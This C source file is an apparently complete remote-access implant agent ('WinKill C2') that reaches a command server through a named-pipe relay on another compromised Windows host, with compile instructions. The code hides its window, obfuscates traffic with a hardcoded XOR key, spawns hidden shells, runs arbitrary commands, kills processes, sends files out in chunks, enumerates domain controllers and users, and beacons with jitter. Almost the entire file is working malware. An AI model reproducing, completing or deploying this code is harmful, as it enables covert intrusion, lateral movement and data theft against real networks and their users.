/*
 * WinKill C2 - SMB Pipe Agent (for lateral movement via relay)
 * ==============================================================
 * Instead of connecting to C2 server via TCP, this agent connects
 * to a named pipe on another compromised host (C1) which relays
 * traffic to the real C2 server.
 *
 * Architecture:
 *   C2 Server <--TCP--> C1 (agent with smb relay enabled)
 *                           ^
 *                           | named pipe: \\.\pipe\winagent
 *                           v
 *   C2 (this SMB agent) ----+
 *
 * Usage: agent_smb.exe \\C1_HOST\pipe\winagent
 *   Default: \\127.0.0.1\pipe\winagent
 *
 * Compile: gcc -O2 -s -m64 -fno-ident -o agent_smb.exe
 *          agent_smb_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32
 */

#include <windows.h>
#include <tlhelp32.h>
#include <winldap.h>
#include <winber.h>
#include <dsrole.h>
#include <dsgetdc.h>
#include <sddl.h>
#include <lm.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

/* Default pipe path - can be changed at build or runtime */
#ifndef SMB_PIPE
#define SMB_PIPE "\\\\.\\pipe\\winagent"
#endif

/* Protocol (same as agent) */
#define CHAN_CTRL       0x00000000
#define CHAN_SHELL_B    0x10000000
#define CHAN_SHELL(id)  (CHAN_SHELL_B | (id))
#define MSG_HEARTBEAT   0x00
#define MSG_STATUS      0x01
#define MSG_SHUTDOWN    0x02
#define MSG_SHELL_SPAWN 0x10
#define MSG_SHELL_DATA  0x11
#define MSG_SHELL_KILL  0x12
#define MSG_PROC_LIST   0x20
#define MSG_PROC_KILL   0x21
#define MSG_FILE_GET    0x30
#define MSG_FILE_PUT    0x31
#define MSG_FILE_DATA   0x32
#define MSG_FILE_CHUNK  0x34
#define MSG_EXEC        0x40
#define MSG_EXEC_OUT    0x41
#define MSG_LATERAL     0x50
#define MSG_DOMAIN      0x60
#define MSG_DOMAIN_OUT  0x61
#define MSG_PERSIST     0x70
#define MSG_PERSIST_OUT 0x71
#define MSG_TOKEN       0x80
#define MSG_TOKEN_OUT   0x81
#define MSG_SMB_LINK    0x90
#define MSG_CONFIG      0xA0
#define MSG_CONFIG_OUT  0xA1

static BYTE g_key[16] = {0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB};
static void X(BYTE *d, DWORD n) { for (DWORD i = 0; i < n; i++) d[i] ^= g_key[i % 16]; }

typedef struct Job { DWORD id, ch; HANDLE hp, ht, hi, ho; BYTE on; struct Job *nx; } Job;
static Job *g_j = NULL; static DWORD g_nid = 1;
static HANDLE g_pipe = INVALID_HANDLE_VALUE;
static volatile LONG g_r = 1;
static CRITICAL_SECTION g_l;
static DWORD g_sleep_ms = 1000, g_jitter_pct = 20;
static WCHAR g_shell_host[64] = L"cmd.exe";

/* ----- Named pipe I/O (instead of sockets) ----- */
static int Tx(DWORD ch, BYTE t, const void *d, DWORD n) {
    DWORD tl = n + 5;
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl + 4);
    if (!b) return -1;
    *(DWORD*)(b) = tl; *(DWORD*)(b+4) = ch; *(BYTE*)(b+8) = t;
    if (d && n) memcpy(b+9, d, n);
    X(b+4, tl);
    DWORD w;
    BOOL ok = WriteFile(g_pipe, b, tl+4, &w, NULL);
    HeapFree(GetProcessHeap(), 0, b);
    return ok ? (int)w : -1;
}

static int Rx(DWORD *ch, BYTE *t, BYTE **d, DWORD *n) {
    DWORD tl;
    DWORD rd;
    if (!ReadFile(g_pipe, &tl, 4, &rd, NULL) || rd != 4) return -1;
    if (tl > 0x800000 || tl < 5) return -1;
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl);
    if (!b) return -1;
    DWORD got = 0;
    while (got < tl) {
        if (!ReadFile(g_pipe, b+got, tl-got, &rd, NULL) || rd == 0) {
            HeapFree(GetProcessHeap(), 0, b); return -1;
        }
        got += rd;
    }
    X(b, tl);
    *ch = *(DWORD*)(b); *t = *(BYTE*)(b+4); *n = tl-5;
    if (*n > 0) { *d = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *n+1);
        if (*d) { memcpy(*d, b+5, *n); (*d)[*n] = 0; } } else *d = NULL;
    HeapFree(GetProcessHeap(), 0, b);
    return 0;
}

/* ----- Job management ----- */
static Job *JN(DWORD ch) {
    Job *j = (Job *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Job));
    if (!j) return NULL;
    j->id = g_nid++; j->ch = ch; j->on = 1;
    EnterCriticalSection(&g_l); j->nx = g_j; g_j = j; LeaveCriticalSection(&g_l);
    return j;
}
static Job *JF(DWORD ch) {
    for (Job *j = g_j; j; j = j->nx) if (j->ch == ch && j->on) return j;
    return NULL;
}
static void JK(Job *j) {
    if (!j || !j->on) return; j->on = 0;
    if (j->hp) { TerminateProcess(j->hp, 0); CloseHandle(j->hp); }
    if (j->ht) CloseHandle(j->ht);
    if (j->hi) CloseHandle(j->hi);
    if (j->ho) CloseHandle(j->ho);
}
static void RP(void) {
    EnterCriticalSection(&g_l);
    for (Job *j = g_j; j; j = j->nx)
        if (j->on && j->hp && WaitForSingleObject(j->hp, 0) == WAIT_OBJECT_0) JK(j);
    LeaveCriticalSection(&g_l);
}

/* ----- Shell stdout bridge ----- */
static DWORD WINAPI SO(LPVOID p) {
    Job *j = (Job *)p; BYTE b[8192]; DWORD n;
    while (j->on && ReadFile(j->ho, b, sizeof(b), &n, NULL) && n > 0)
        Tx(j->ch, MSG_SHELL_DATA, b, n);
    return 0;
}

/* ----- Spawn shell ----- */
static Job *SP(DWORD ch) {
    Job *existing = JF(ch); if (existing) return existing;
    HANDLE r1,w1,r2,w2; SECURITY_ATTRIBUTES sa = {sizeof(sa),NULL,TRUE};
    if (!CreatePipe(&r1,&w1,&sa,0)) return NULL;
    if (!CreatePipe(&r2,&w2,&sa,0)) { CloseHandle(r1);CloseHandle(w1);return NULL; }
    WCHAR cmd[512];
    if (_wcsicmp(g_shell_host, L"powershell.exe")==0)
        wsprintfW(cmd, L"%ls -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -Command -", g_shell_host);
    else wsprintfW(cmd, L"%ls", g_shell_host);
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si)); si.cb=sizeof(si);
    si.dwFlags=0x101; si.wShowWindow=0;
    si.hStdInput=r1; si.hStdOutput=w2; si.hStdError=w2;
    if (!CreateProcessW(NULL,cmd,NULL,NULL,TRUE,0x08000000,NULL,NULL,&si,&pi)) {
        CloseHandle(r1);CloseHandle(w1);CloseHandle(r2);CloseHandle(w2);return NULL;
    }
    CloseHandle(r1);CloseHandle(w2);
    Job *j = JN(ch);
    if (!j) { TerminateProcess(pi.hProcess,0);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
        CloseHandle(w1);CloseHandle(r2);return NULL; }
    j->hp=pi.hProcess; j->ht=pi.hThread; j->hi=w1; j->ho=r2;
    CreateThread(NULL,0,SO,j,0,NULL);
    return j;
}

/* ----- Direct program execution (no cmd.exe!) ----- */
static void RunCommand(const char *cmdLine) {
    HANDLE r1,w1,r2,w2; SECURITY_ATTRIBUTES sa={sizeof(sa),NULL,TRUE};
    if (!CreatePipe(&r1,&w1,&sa,0)) goto err;
    if (!CreatePipe(&r2,&w2,&sa,0)) {CloseHandle(r1);CloseHandle(w1);goto err;}
    SetHandleInformation(w1,HANDLE_FLAG_INHERIT,0);SetHandleInformation(r2,HANDLE_FLAG_INHERIT,0);
    { STARTUPINFOA si;PROCESS_INFORMATION pi;
        ZeroMemory(&si,sizeof(si));si.cb=sizeof(si);
        si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
        si.hStdInput=r1;si.hStdOutput=w2;si.hStdError=w2;
        char *cl=(char*)HeapAlloc(GetProcessHeap(),0,strlen(cmdLine)+1);
        if(!cl){CloseHandle(r1);CloseHandle(w1);CloseHandle(r2);CloseHandle(w2);goto err;}
        strcpy(cl,cmdLine);
        if(!CreateProcessA(NULL,cl,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
            DWORD le=GetLastError();HeapFree(GetProcessHeap(),0,cl);
            CloseHandle(r1);CloseHandle(w1);CloseHandle(r2);CloseHandle(w2);
            char eb[256]; int l=wsprintfA(eb,"ERROR: CreateProcess failed (%lu)\r\n",le);
            Tx(CHAN_CTRL,MSG_EXEC_OUT,eb,l);return;
        }
        HeapFree(GetProcessHeap(),0,cl);CloseHandle(r1);CloseHandle(w2);
        BYTE buf[8192];DWORD n;HANDLE hOut=r2;DWORD st=GetTickCount();
        while(1){DWORD av=0;
            if(PeekNamedPipe(hOut,NULL,0,NULL,&av,NULL)&&av>0){
                if(ReadFile(hOut,buf,sizeof(buf),&n,NULL)&&n>0)Tx(CHAN_CTRL,MSG_EXEC_OUT,buf,n);
                st=GetTickCount();
            }else{if(WaitForSingleObject(pi.hProcess,50)==WAIT_OBJECT_0){
                while(PeekNamedPipe(hOut,NULL,0,NULL,&av,NULL)&&av>0)
                {if(ReadFile(hOut,buf,sizeof(buf)>av?av:sizeof(buf),&n,NULL)&&n>0)Tx(CHAN_CTRL,MSG_EXEC_OUT,buf,n);}
                break;}
                if(GetTickCount()-st>60000){TerminateProcess(pi.hProcess,0);Tx(CHAN_CTRL,MSG_EXEC_OUT,(BYTE*)"\r\n[TIMEOUT]\r\n",12);break;}
                Sleep(50);}}
        Tx(CHAN_CTRL,MSG_EXEC_OUT,(BYTE*)"\r\n",2);
        CloseHandle(w1);CloseHandle(r2);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
        return; }
err: Tx(CHAN_CTRL,MSG_EXEC_OUT,(BYTE*)"ERROR: Pipe failed\r\n",20);
}

/* ----- Process list ----- */
static void PS(void) {
    char b[16384]={0};int p=0;
    HANDLE sn=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(sn==INVALID_HANDLE_VALUE)return;
    SYSTEM_INFO si;GetSystemInfo(&si);
    BOOL is64=(si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64);
    p+=wsprintfA(b+p,"%-8s %-6s %-5s %s\r\n","PID","PPID","Arch","Name");
    p+=wsprintfA(b+p,"----------------------------------------\r\n");
    PROCESSENTRY32 pe;pe.dwSize=sizeof(pe);
    if(Process32First(sn,&pe)){do{int r=(int)sizeof(b)-p-256;if(r<0)break;
        const char *arch="?";if(is64){BOOL w64=FALSE;HANDLE hp=OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,pe.th32ProcessID);
            if(hp){IsWow64Process(hp,&w64);CloseHandle(hp);}arch=w64?"x86":"x64";}else arch="x86";
        p+=wsprintfA(b+p,"%-8lu %-6lu %-5s %s\r\n",pe.th32ProcessID,pe.th32ParentProcessID,arch,pe.szExeFile);
    }while(Process32Next(sn,&pe));}CloseHandle(sn);Tx(CHAN_CTRL,MSG_PROC_LIST,b,p);
}

/* ----- File download ----- */
static void FileDownload(const char *path) {
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){char e[256];int l=wsprintfA(e,"ERROR: Cannot open %s\r\n",path);Tx(CHAN_CTRL,MSG_STATUS,e,l);return;}
    DWORD ts=GetFileSize(hf,NULL),pl=(DWORD)strlen(path);
    BYTE hdr[6+MAX_PATH];*(DWORD*)hdr=ts;*(WORD*)(hdr+4)=(WORD)pl;memcpy(hdr+6,path,pl);
    Tx(CHAN_CTRL,MSG_FILE_DATA,hdr,6+pl);
    BYTE chunk[65535+10];DWORD off=0;
    while(off<ts){DWORD cs=min(65535,ts-off);DWORD r;*(DWORD*)(chunk)=off;
        if(ReadFile(hf,chunk+4,cs,&r,NULL)&&r>0){Tx(CHAN_CTRL,MSG_FILE_CHUNK,chunk,4+r);off+=r;}else break;}
    DWORD end=0xFFFFFFFF;Tx(CHAN_CTRL,MSG_FILE_CHUNK,&end,4);CloseHandle(hf);
}

/* ----- Domain discovery ----- */
static void DomainDiscover(void) {
    char out[4096]={0};int pos=0;
    DSROLE_PRIMARY_DOMAIN_INFO_BASIC *info;
    DWORD err=DsRoleGetPrimaryDomainInformation(NULL,DsRolePrimaryDomainInfoBasic,(BYTE**)&info);
    if(err==NO_ERROR&&info->DomainNameDns)pos+=wsprintfA(out+pos,"[Domain] %S\r\n",info->DomainNameDns);
    if(info)DsRoleFreeMemory(info);
    WCHAR d[256];DWORD dl=256;
    if(GetEnvironmentVariableW(L"USERDOMAIN",d,dl))pos+=wsprintfA(out+pos,"[UserDomain] %S\r\n",d);
    PDOMAIN_CONTROLLER_INFOA dc=NULL;
    DWORD r=DsGetDcNameA(NULL,NULL,NULL,NULL,DS_DIRECTORY_SERVICE_REQUIRED|DS_RETURN_DNS_NAME,&dc);
    if(r==NO_ERROR&&dc){pos+=wsprintfA(out+pos,"[DC] %s\r\n",dc->DomainControllerName);NetApiBufferFree(dc);}
    WCHAR un[256];DWORD unl=256;if(GetUserNameW(un,&unl))pos+=wsprintfA(out+pos,"[User] %S\r\n",un);
    WCHAR cn[256];DWORD cnl=256;if(GetComputerNameW(cn,&cnl))pos+=wsprintfA(out+pos,"[Computer] %S\r\n",cn);
    Tx(CHAN_CTRL,MSG_DOMAIN_OUT,out,pos);
}

/* ----- Dispatch ----- */
static void Dispatch(DWORD ch, BYTE t, BYTE *d, DWORD n) {
    if((ch&0xF0000000)==CHAN_SHELL_B && t==MSG_SHELL_DATA){
        Job *j=JF(ch);if(j&&j->on&&d){DWORD w;WriteFile(j->hi,d,n,&w,NULL);}if(d)HeapFree(GetProcessHeap(),0,d);return;}
    switch(t){
        case MSG_HEARTBEAT: break;
        case MSG_SHUTDOWN: g_r=0; break;
        case MSG_SHELL_SPAWN: if(n>=4){DWORD nc=*(DWORD*)d;Job*j=SP(nc);
            char r[128];int l=wsprintfA(r,"OK shell ch=%08X id=%lu\r\n",nc,j?j->id:0);Tx(CHAN_CTRL,MSG_STATUS,r,l);}break;
        case MSG_PROC_LIST: PS(); break;
        case MSG_PROC_KILL: if(d&&n){DWORD pi=(DWORD)atoi((char*)d);
            HANDLE h=OpenProcess(PROCESS_TERMINATE,FALSE,pi);char m[256];
            if(h){TerminateProcess(h,0);CloseHandle(h);wsprintfA(m,"[+] Killed PID %lu\r\n",pi);}
            else wsprintfA(m,"[-] Failed PID %lu\r\n",pi);Tx(CHAN_CTRL,MSG_PROC_KILL,m,(DWORD)strlen(m));}break;
        case MSG_FILE_GET: if(d&&n)FileDownload((char*)d); break;
        case MSG_EXEC: if(d&&n)RunCommand((char*)d); break;
        case MSG_DOMAIN: if(d&&n){if(_stricmp((char*)d,"discover")==0)DomainDiscover();}break;
    }
    if(d)HeapFree(GetProcessHeap(),0,d);
}

static void JitterSleep(void) {
    DWORD base=g_sleep_ms;
    if(g_jitter_pct>0&&g_jitter_pct<=100){
        int j=(int)(((GetTickCount()*1103515245+12345)&0x7FFFFFFF)%(base*g_jitter_pct/50));
        j-=(int)(base*g_jitter_pct/100);base=(DWORD)((int)base+j);}
    if(base<100)base=100;if(base>3600000)base=3600000;Sleep(base);
}

/* ----- Main ----- */
DWORD WINAPI AgentMain(LPVOID p) {
    InitializeCriticalSection(&g_l);

    /* Connect to the pipe (C1's SMB relay) */
    const char *pipeName = (const char *)p;
    if (!pipeName) pipeName = SMB_PIPE;

    g_pipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0,
                         NULL, OPEN_EXISTING, 0, NULL);
    if (g_pipe == INVALID_HANDLE_VALUE) {
        for (int retry = 0; retry < 30; retry++) {
            Sleep(10000);  // Retry every 10 seconds
            g_pipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0,
                                 NULL, OPEN_EXISTING, 0, NULL);
            if (g_pipe != INVALID_HANDLE_VALUE) break;
        }
        if (g_pipe == INVALID_HANDLE_VALUE) goto done;
    }

    /* Set pipe to message mode */
    DWORD pipeMode = PIPE_READMODE_BYTE | PIPE_WAIT;
    SetNamedPipeHandleState(g_pipe, &pipeMode, NULL, NULL);

    /* Auto-spawn shell */
    SP(CHAN_SHELL(1));

    /* Send host info */
    { char info[512]; WCHAR h[256],u[256]; DWORD hl=256,ul=256;
        GetComputerNameW(h,&hl);GetUserNameW(u,&ul);
        int l=wsprintfA(info,"HOST=%S USER=%S OS=Windows PID=%lu (via SMB)",h,u,GetCurrentProcessId());
        Tx(CHAN_CTRL,MSG_STATUS,info,l); }

    /* Main loop */
    DWORD lr=0,lastData=GetTickCount();
    while(g_r){
        DWORD ch;BYTE t;BYTE *d;DWORD n;
        /* Non-blocking check - peek at pipe for available data */
        DWORD avail=0;
        if(PeekNamedPipe(g_pipe,NULL,0,NULL,&avail,NULL)&&avail>0){
            if(Rx(&ch,&t,&d,&n)==0){Dispatch(ch,t,d,n);lastData=GetTickCount();}
            else break;
        }
        if(GetTickCount()-lastData>120000)break;
        if(GetTickCount()-lr>30000){RP();lr=GetTickCount();}
        if(avail==0&&g_sleep_ms>100)JitterSleep();
        else if(avail==0)Sleep(50);
    }

done:
    EnterCriticalSection(&g_l);
    for(Job *j=g_j;j;){Job *nx=j->nx;JK(j);j=nx;}
    LeaveCriticalSection(&g_l);
    if(g_pipe!=INVALID_HANDLE_VALUE)CloseHandle(g_pipe);
    DeleteCriticalSection(&g_l);
    return 0;
}

/* ----- EXE entry ----- */
int main(int argc, char *argv[]) {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    const char *pipeName = SMB_PIPE;
    if (argc > 1) pipeName = argv[1];

    AgentMain((LPVOID)pipeName);
    return 0;
}
